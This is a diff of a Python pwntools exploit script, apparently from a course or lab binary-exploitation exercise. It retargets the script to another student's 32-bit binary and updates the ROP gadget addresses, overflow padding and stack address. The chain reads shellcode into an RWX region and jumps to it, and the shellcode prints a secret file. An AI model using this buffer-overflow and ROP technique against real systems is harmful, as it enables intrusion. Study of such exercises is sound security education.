@@ -6,16 +6,17 @@ PORT = 0
 
 file_secret = "secret.txt"
 # file_binary = "10101_YAKOBCHUK_Dmytro_32"
-file_binary = "10126_ZELENIN_Vladyslav_32"
+# file_binary = "10126_ZELENIN_Vladyslav_32"
+file_binary = "10122_STOKOP_Sofia_32"
 file_breakpoints = "breaks32.gdb"
 
 # GADGETS
-pop_eax = p32(0x80b0e7a)  # pop eax; ret
-pop_ebx = p32(0x8065a6b)  # pop ebx; ret
-mov_ecx_eax___mov_eax_ecx = p32(0x8093ec8)  # mov ecx, eax; mov eax, ecx; ret
-pop_edx___pop_ebx = p32(0x80585e9)  # pop edx; pop ebx; ret
-syscall = p32(0x8071940)  # int 0x80; ret
-ret = p32(0x80b0e7b)  # ret
+pop_eax = p32(0x80b0fca)  # pop eax; ret
+pop_ebx = p32(0x8065bbb)  # pop ebx; ret
+mov_ecx_eax___mov_eax_ecx = p32(0x8094018)  # mov ecx, eax; mov eax, ecx; ret
+pop_edx___pop_ebx = p32(0x8058739)  # pop edx; pop ebx; ret
+syscall = p32(0x8071a90)  # int 0x80; ret
+ret = p32(0x8071a92)  # ret
 
 
 def run_local(debug = True, wsl2 = True):
@@ -123,7 +124,7 @@ def main():
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
     # Buffer overflow (with ret chain)
-    buf = b"A" * 329  # eax before "cmp eax, 0x539"
+    buf = b"A" * 973  # eax before "cmp eax, 0x539"
     buf += p32(1337)
     buf += ret * 200
 
@@ -138,13 +139,13 @@ def main():
     buf += sys_read(stdin_fd, rwx_addr, len(sc))
 
     buf += p32(rwx_addr)  # Jump to shellcode
-    buf = buf.ljust(1653, b"B")  # ecx after "pop ecx"
-    buf += p32(0xffffda00)
+    buf = buf.ljust(4873, b"B")  # ecx after "pop ecx"
+    buf += p32(0xffffd000)
     # buf += p32(0xdddddddd)
     find_bad_bytes(buf)
 
     # RUN PROCESS
-    # buf = cyclic(5000)
+    buf = cyclic(5000)
     p = run_local(debug = True, wsl2 = True)
     # p = remote(IP, PORT)
 
